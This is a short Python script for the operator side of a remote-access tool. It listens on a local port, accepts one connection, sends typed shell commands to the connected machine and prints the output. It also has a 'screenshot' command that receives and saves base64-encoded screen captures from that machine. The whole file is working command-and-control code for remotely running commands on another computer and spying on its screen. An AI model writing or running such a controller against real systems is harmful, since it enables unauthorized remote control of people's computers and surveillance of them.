import socket
import base64

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("127.0.0.1",8887))
print("Listenning...")
s.listen(1)
client,addr = s.accept()
print("Connected...")


while True:
    cmd = input("$ ")
    client.send(cmd.encode())
    if cmd == "bye":
        break
    elif cmd == "screenshot":

         # receive size
        size = int(client.recv(1024).decode())
        client.send(b"OK")

        # receive image data
        data = b""
        while len(data) < size:
            packet = client.recv(4096)
            data += packet

        img_data = base64.b64decode(data)

        with open("screenshot.png", "wb") as f:
            f.write(img_data)

        print("[+] Screenshot saved")
        continue
    else:
        output = (client.recv(1024)).decode()
        print(output)

client.close()
s.close()
